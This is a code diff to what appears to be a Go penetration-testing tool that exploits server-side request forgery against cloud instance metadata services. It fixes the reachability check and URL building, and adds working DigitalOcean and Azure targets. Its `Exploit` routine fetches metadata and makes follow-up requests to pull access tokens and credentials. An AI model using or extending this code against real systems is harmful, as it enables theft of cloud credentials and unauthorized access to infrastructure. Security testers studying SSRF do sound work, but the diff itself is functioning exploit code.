@@ -42,7 +42,7 @@ func (c *CloudSsrf) CheckLitmus() bool {
 
 	// check if each specified URL + endpoint is reachable
 	for _, endpoint := range c.Endpoint {
-		req, err := http.NewRequest("GET", endpoint+"/"+c.Litmus, nil)
+		req, err := http.NewRequest("GET", endpoint+c.Litmus, nil)
 		if err != nil {
 			continue
 		}
@@ -60,7 +60,7 @@ func (c *CloudSsrf) CheckLitmus() bool {
 
 		// must get a 200 status to be reachable/exploitable
 		// TODO: validate if this is true for all providers
-		if resp.StatusCode != 200 {
+		if resp.StatusCode == 200 {
 			c.Actual = endpoint
 			return true
 		}
@@ -76,7 +76,7 @@ func (c *CloudSsrf) Exploit() SsrfResults {
 	for check, endpoint := range c.Paths {
 		fmt.Printf("Running `%s`\n", check)
 
-		url := c.Actual + "/" + endpoint
+		url := c.Actual + endpoint
 		req, err := http.NewRequest("GET", url, nil)
 		if err != nil {
 			continue
@@ -97,8 +97,9 @@ func (c *CloudSsrf) Exploit() SsrfResults {
 			continue
 		}
 
-		// we'll refrain from actually parsing the body in anyway other than string conversion
-		info, err := c.PostProcessor(check, endpoint, resp)
+		// given each key, perform any post-processing on the data, such as
+		// reaching out to an additional endpoint to recover data
+		info, err := c.PostProcessor(check, url, resp)
 		if err != nil {
 			continue
 		}
@@ -106,6 +107,14 @@ func (c *CloudSsrf) Exploit() SsrfResults {
 		results[check] = info
 	}
 	return results
+}
+
+func DefaultPostProcessor(check string, url string, resp *http.Response) (string, error) {
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return "", err
+	}
+	return string(body), nil
 }
 
 func GetMetadataEndpoints() MetadataEndpoints {
@@ -137,7 +146,8 @@ func GetMetadataEndpoints() MetadataEndpoints {
 				if check == "meta_token" || check == "user_token" {
 
 					// new request to now retrieve sensitive credentials
-					url := url + "/" + string(body)
+					url := url + string(body)
+					fmt.Println(url)
 					req, err := http.NewRequest("GET", url, nil)
 					if err != nil {
 						return "", err
@@ -145,6 +155,7 @@ func GetMetadataEndpoints() MetadataEndpoints {
 
 					tokenResp, err := client.Do(req)
 					if err != nil {
+						fmt.Println("Request to service failed")
 						return "", err
 					}
 
@@ -183,13 +194,30 @@ func GetMetadataEndpoints() MetadataEndpoints {
 				return string(body), nil
 			},
 		},
-		/*
-		   "do": CloudSsrf{
-		       Litmus: "http://169.254.169.254/metadata/v1/"
-		   },
-		   "azure": CloudSsrf{
-		       Litmus: "http://169.254.169.254/metadata/instance",
-		   },
-		*/
+		"do": &CloudSsrf{
+			Client:   &client,
+			Endpoint: []string{"http://169.254.169.254"},
+			Litmus:   "/metadata/v1/",
+			Paths: map[string]string{
+				"all": "/metadata/v1.json",
+			},
+			PostProcessor: func(check string, url string, resp *http.Response) (string, error) {
+				return DefaultPostProcessor(check, url, resp)
+			},
+		},
+		"azure": &CloudSsrf{
+			Client:   &client,
+			Endpoint: []string{"http://169.254.169.254"},
+			Litmus:   "/metadata/",
+			Headers: &map[string]string{
+				"Metadata": "True",
+			},
+			Paths: map[string]string{
+				"all": "/metadata/instance?api-version=2017-04-02",
+			},
+			PostProcessor: func(check string, url string, resp *http.Response) (string, error) {
+				return DefaultPostProcessor(check, url, resp)
+			},
+		},
 	}
 }
